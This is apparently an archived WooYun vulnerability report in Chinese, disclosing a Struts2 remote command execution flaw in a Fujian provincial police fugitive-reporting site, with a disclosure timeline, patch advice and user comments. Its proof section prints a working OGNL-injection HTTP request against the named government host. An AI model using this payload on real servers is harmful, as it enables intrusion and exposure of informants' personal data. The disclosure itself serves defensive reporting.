{"id": 18066, "wybug_id": "wooyun-2012-09465", "wybug_title": "福建公安厅重要逃犯网上追缉系统远程命令漏洞", "wybug_corp": "福建公安厅", "wybug_author": "Tank", "wybug_date": "2012-07-11 18:10", "wybug_open_date": "2012-08-25 18:11", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-25：\t细节向公众公开  简要描述： 福建公安厅重要逃犯网上追缉系统是网民举报重要逃犯的举报平台，该平台上存在较为严重的漏洞，该漏洞是最近比较流行的Struts2远程命令执行漏洞，恶意入侵者或着别有用心的人可通过该漏洞渗透进入平台主机，修改、删除逃犯图片或着通过在主机嗅探数据包，可截获举报人的姓名、电话、地址等信息，间接威胁举报人的人身安全。 详细说明：  福建公安厅重要逃犯网上追缉系统是网民举报重要逃犯的举报平台，该平台上存在较为严重的漏洞，该漏洞是最近比较流行的Struts2远程命令执行漏洞，由于<=Struts2.3.1版本中的缺陷，攻击命令可以绕过限制直接被后台的Java程序任意执行。   漏洞证明：  测试字符串：POST /action/tftj/index.action HTTP/1.1Content-Type: application/x-www-form-urlencodedHost:www.fjgat.gov.cnContent-Length: 258('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thread@sleep(5000)')(d))工具利用截图：\n\n   修复方案：  打补丁或升级到Struts2最新版本   版权声明：转载请注明来源 Tank@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2012-07-16 01:52 厂商回复： CNVD确认漏洞情况，确认非WOOYUN首报，rank 3 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-13 14:22 |    \t\t风星剑仙 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 世界＆世界＝？永恒＋永恒＝？)\t\t \n  我就靠了，这个牛X啊……这样子谁还敢在网上报案，直接嗅探，然后就等着夜半敲门……怕怕……    \n     2012-07-16 09:17 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:52        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  其实福建省公安厅的多数应用都是2006年或是之前的构建，问题有很多，比如在公民信息方面的确可以说是严重，也该更新改版了。    \n     2012-08-25 23:04 |    \t\t继续沉默 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 好好学习，天天向上)\t\t \n  呵呵，多久了，还没修复呢    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}